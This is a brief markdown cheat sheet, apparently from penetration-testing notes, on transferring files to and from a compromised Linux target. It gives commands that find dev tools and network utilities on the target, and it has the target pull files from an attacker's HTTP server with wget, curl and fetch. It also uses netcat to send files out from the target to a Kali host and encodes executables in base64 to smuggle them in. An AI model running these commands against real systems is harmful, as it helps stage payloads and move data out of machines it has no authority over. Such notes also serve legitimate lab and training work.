# Linux File Transfer
## Method
```bash
# Check for Dev Environements
find / -name perl*
find / -name python*
find / -name gcc* 
find / -name cc

# Check to see how files can be uploaded
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp
```

## Python SimpleHTTPServer
```bash
#on Attacker
python -m SimpleHTTPServer 9999

#on target
wget <ip>:9999/file.txt
curl -O http://<ip>/file.txt
```

------------------------------
## Apache
```bash
# On Attacker
cp filetosend.txt /var/www/html
service apache2 start

# On Target
wget http://attackerip/file
curl http://attackerip/file > file
fetch http://attackerip/file        # on BSD
```
---------------------------------
## Netcat
```bash
### From target to Kali)
# Listen on Kali
nc -lvp 4444 > file

# Send from Target machine
nc <kali_ip> 4444 < file

### From Kali to target
# on target, wait for the file
nc -nvlp 55555 > file
cat binary | base64 | nc -nlvp 4444

# on kali, push the file
nc $victimip 55555 < file

```
## Sending Executables
```bash
# Encode executable
base64 executable
# copy the output
# paste it in a file called file.txt
# decode it and create the executable
base64 -d file.txt > executable
```

